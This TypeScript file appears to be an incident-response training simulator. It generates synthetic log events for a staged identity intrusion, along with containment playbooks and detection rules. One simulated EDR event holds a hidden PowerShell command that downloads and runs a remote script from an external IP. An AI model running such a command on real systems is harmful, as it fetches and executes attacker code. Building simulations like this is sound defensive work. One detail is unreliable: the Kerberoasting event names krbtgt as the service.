
import { randomUUID } from 'crypto';
import * as fs from 'fs';
import * as path from 'path';

// Types for the simulation
export interface SimulationEvent {
  id: string;
  timestamp: string;
  source: string;
  eventType: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  details: Record<string, any>;
  mitreTechniqueId?: string;
}

export interface IntrusionCampaignResult {
  campaignId: string;
  startTime: string;
  endTime: string;
  events: SimulationEvent[];
  containmentSuccess: boolean;
  containmentTime?: string;
  artifacts: {
    logs: any[];
    playbooks: any[];
    detectionRules: any[];
  };
}

export class IdentityIntrusionSimulator {
  private startTime: Date;
  private endTime: Date;
  private events: SimulationEvent[] = [];

  constructor() {
    this.startTime = new Date();
    // Default to 72 hour window ending now
    this.endTime = new Date();
    this.startTime.setHours(this.endTime.getHours() - 72);
  }

  /**
   * Generates a full 72-hour intrusion campaign simulation
   */
  public generateCampaign(targetDomain: string = 'acme-corp.com'): IntrusionCampaignResult {
    const campaignId = randomUUID();
    this.events = [];

    // 1. Initial Access (Hour 0-4)
    this.simulateInitialAccess(targetDomain);

    // 2. Discovery & Credential Access (Hour 4-12)
    this.simulateDiscoveryAndCreds(targetDomain);

    // 3. Lateral Movement (Hour 12-36)
    this.simulateLateralMovement(targetDomain);

    // 4. Privilege Escalation (Hour 36-48)
    this.simulatePrivilegeEscalation(targetDomain);

    // 5. Cloud Pivot (Hour 48-60)
    this.simulateCloudPivot(targetDomain);

    // 6. Actions on Objectives (Hour 60-72) - Only if not contained
    // For this simulation, we'll assume containment happens at Hour 65 based on the user prompt "Success = containment"
    const containmentTime = new Date(this.startTime.getTime() + (65 * 60 * 60 * 1000));

    // Filter events that happen after containment
    this.events = this.events.filter(e => new Date(e.timestamp) <= containmentTime);

    // Add containment event
    this.events.push({
      id: randomUUID(),
      timestamp: containmentTime.toISOString(),
      source: 'SOAR',
      eventType: 'CONTAINMENT_ACTION',
      severity: 'high',
      details: {
        action: 'Isolate Host',
        host: 'WORKSTATION-PATIENT-ZERO',
        user: 'jdoe',
        reason: 'Confirmed Lateral Movement to DC'
      }
    });

    return {
      campaignId,
      startTime: this.startTime.toISOString(),
      endTime: this.endTime.toISOString(),
      events: this.events.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()),
      containmentSuccess: true,
      containmentTime: containmentTime.toISOString(),
      artifacts: {
        logs: this.generateSyntheticLogs(),
        playbooks: this.loadPlaybooks(),
        detectionRules: this.loadDetectionRules()
      }
    };
  }

  private addEvent(offsetHours: number, source: string, type: string, severity: 'low' | 'medium' | 'high' | 'critical', details: any, mitre?: string) {
    const timestamp = new Date(this.startTime.getTime() + (offsetHours * 60 * 60 * 1000));
    // Add some random jitter (+/- 15 mins)
    timestamp.setMinutes(timestamp.getMinutes() + (Math.random() * 30 - 15));

    this.events.push({
      id: randomUUID(),
      timestamp: timestamp.toISOString(),
      source,
      eventType: type,
      severity,
      details,
      mitreTechniqueId: mitre
    });
  }

  private simulateInitialAccess(domain: string) {
    // Phishing Email Delivery
    this.addEvent(0.5, 'EmailGateway', 'EMAIL_DELIVERED', 'low', {
      sender: 'hr-updates@benefits-enrollment-secure.com',
      recipient: `jdoe@${domain}`,
      subject: 'Urgent: 2025 Benefits Enrollment',
      attachment: 'benefits_guide_2025.html'
    }, 'T1566.001');

    // User Click
    this.addEvent(1.2, 'WebProxy', 'URL_CLICK', 'medium', {
      user: `jdoe@${domain}`,
      url: 'http://benefits-enrollment-secure.com/login',
      category: 'Uncategorized'
    });

    // Credential Harvest (Okta)
    this.addEvent(1.5, 'Okta', 'LOGIN_SUCCESS', 'medium', {
      user: `jdoe@${domain}`,
      ip: '45.13.12.99', // External IP
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      geo: 'Unknown/Proxy'
    }, 'T1078');
  }

  private simulateDiscoveryAndCreds(domain: string) {
    // CrowdStrike EDR picks up suspicious powershell
    this.addEvent(5.0, 'CrowdStrike', 'PROCESS_EXECUTION', 'medium', {
      host: 'WORKSTATION-JDOE',
      user: `jdoe@${domain}`,
      commandLine: 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://45.13.12.99/recon.ps1\'))"',
      parentProcess: 'explorer.exe'
    }, 'T1059.001');

    // Splunk Alert
    this.addEvent(5.1, 'Splunk', 'ALERT_TRIGGERED', 'high', {
      alertName: 'Suspicious PowerShell Download String',
      host: 'WORKSTATION-JDOE'
    });
  }

  private simulateLateralMovement(domain: string) {
    // Pass-the-Hash / RDP
    this.addEvent(15.0, 'WindowsSecurity', 'LOGON_TYPE_3', 'medium', {
      host: 'FILESERVER-01',
      user: `admin_service`,
      sourceIp: '192.168.1.50' // JDOE workstation
    }, 'T1021.001');

    // CrowdStrike Lateral Movement
    this.addEvent(15.2, 'CrowdStrike', 'LATERAL_MOVEMENT', 'high', {
      sourceHost: 'WORKSTATION-JDOE',
      targetHost: 'FILESERVER-01',
      technique: 'SMB Exec'
    }, 'T1021.002');
  }

  private simulatePrivilegeEscalation(domain: string) {
    // Kerberoasting
    this.addEvent(38.0, 'ActiveDirectory', 'TICKET_REQUEST', 'medium', {
      service: 'krbtgt',
      user: `jdoe@${domain}`,
      encryptionType: 'RC4'
    }, 'T1558.003');
  }

  private simulateCloudPivot(domain: string) {
    // AAD Connect Sync Account Abuse
    this.addEvent(50.0, 'AzureAD', 'SUSPICIOUS_SYNC_ACTIVITY', 'critical', {
      user: 'Sync_Service_Account',
      ip: '45.13.12.99',
      action: 'PasswordReset'
    }, 'T1484.002');
  }

  private generateSyntheticLogs(): any[] {
    // Transform events into "raw" logs format (e.g. Splunk JSON)
    return this.events.map(e => ({
      _time: e.timestamp,
      sourcetype: e.source.toLowerCase(),
      event: e
    }));
  }

  private loadPlaybooks(): any[] {
    // In a real app, read from JSON file. Here, return hardcoded.
    return [
      {
        id: 'PB-IDENTITY-001',
        name: 'Identity Compromise Response',
        steps: [
          'Verify user activity with user via out-of-band communication',
          'Reset user password in AD and Okta',
          'Revoke all Okta sessions',
          'Check for MFA enrollments added recently',
          'Isolate workstation CrowdStrike'
        ]
      },
      {
        id: 'PB-CLOUD-002',
        name: 'Azure AD Suspicious Sync',
        steps: [
          'Disable AAD Connect Sync Account',
          'Review AAD Audit Logs for new Global Admins',
          'Initiate Global Password Reset for Admins'
        ]
      }
    ];
  }

  private loadDetectionRules(): any[] {
    return [
      {
        ruleId: 'SIGMA-001',
        title: 'Suspicious PowerShell Download',
        severity: 'high',
        query: 'CommandLine="*downloadstring*" AND CommandLine="*http*"'
      },
      {
        ruleId: 'SIGMA-002',
        title: 'Okta Login from Rare IP',
        severity: 'medium',
        query: 'event.type="user.session.start" AND security_context.as.organization.name!="CORP_ISP"'
      }
    ];
  }
}
